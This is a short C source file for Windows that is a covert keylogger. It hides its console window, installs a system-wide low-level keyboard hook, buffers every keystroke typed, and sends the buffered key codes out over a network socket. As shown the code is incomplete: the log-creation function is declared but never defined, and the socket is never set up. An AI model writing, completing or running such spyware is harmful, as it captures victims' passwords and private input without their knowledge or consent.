#include <winsock.h>
#define _WIN32_WINNT 0x0601
#include <stdio.h>
#include <string.h>
#include <windows.h>


void hideConsole();
void createLog();
LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);

HHOOK hook;
SOCKET s;

int main(void) {
  hideConsole();
  createLog();
  hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
  MSG msg;
  while (GetMessageA(&msg, NULL, 0, 0) > 0) {
    TranslateMessage(&msg);
    DispatchMessageA(&msg);
  }
  UnhookWindowsHookEx(hook);
  return 0;
}

void hideConsole() {
  HWND console = GetConsoleWindow();
  ShowWindow(console, SW_MINIMIZE);
  ShowWindow(console, SW_HIDE);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  static int chars_in_cur_line = 0;
  static char key_buf[512];
  if (nCode >= 0 && wParam == WM_KEYDOWN) {
    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
    key_buf[chars_in_cur_line++] = kbd->vkCode;
    if (chars_in_cur_line == sizeof(key_buf)) {
      send(s, key_buf, sizeof(key_buf), 0);
      chars_in_cur_line = 0;
    }
  }
  return CallNextHookEx(hook, nCode, wParam, lParam);
}
